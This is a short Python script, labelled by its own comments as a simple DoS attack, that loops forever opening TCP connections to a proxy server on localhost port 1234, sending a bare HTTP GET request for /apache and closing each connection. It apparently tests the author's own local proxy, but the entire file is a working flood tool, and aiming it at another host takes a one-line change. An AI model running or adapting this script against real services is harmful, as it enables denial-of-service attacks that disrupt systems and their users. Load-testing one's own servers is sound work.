# simple DOS attack script
# Opens a bunch of TCP connections to proxy server
# and sends simple GET request and immediately closes

import socket, sys, os
print ("[ Attacking locally hosted proxy server ]")
def flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(("localhost", 1234)) 
    str1 = "GET /apache HTTP/1.1\r\n"
    print (">> GET /apache HTTP/1.1")
    s.send(str1.encode()) 
    str2 = "Host: localhost\r\n\r\n"
    s.send(str2.encode()); 
    s.close() 

# Driver code 
while (True): 
    flood()